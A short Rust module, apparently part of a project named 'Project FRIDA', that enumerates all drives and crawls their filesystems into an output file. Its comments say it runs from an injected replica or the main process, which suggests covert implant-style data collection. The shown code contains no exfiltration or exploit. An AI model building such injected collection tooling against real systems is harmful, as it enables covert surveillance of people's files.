//! Agent tasks module for Project FRIDA.
//!
//! This module contains the core data collection logic that can be executed
//! by either an injected replica or the main process as a fallback.

use crate::{constants, crawler, drives, log::Log};

/// Runs the core data collection tasks.
pub async fn run() {
    Log::info("Starting agent data collection tasks...".to_string());

    let drives = drives::list_drives();
    if drives.is_empty() {
        Log::error("No drives found to crawl.".to_string());
        return;
    }

    Log::info(format!(
        "Starting filesystem crawl for {} drives...",
        drives.len()
    ));

    let output_path = constants::crawler_output_file();
    if let Err(e) = crawler::crawl_drives(&drives, output_path.to_str().unwrap_or_default()).await {
        Log::error(format!("Filesystem crawl failed: {}", e));
    } else {
        Log::info("Filesystem crawl completed successfully.".to_string());
    }
}
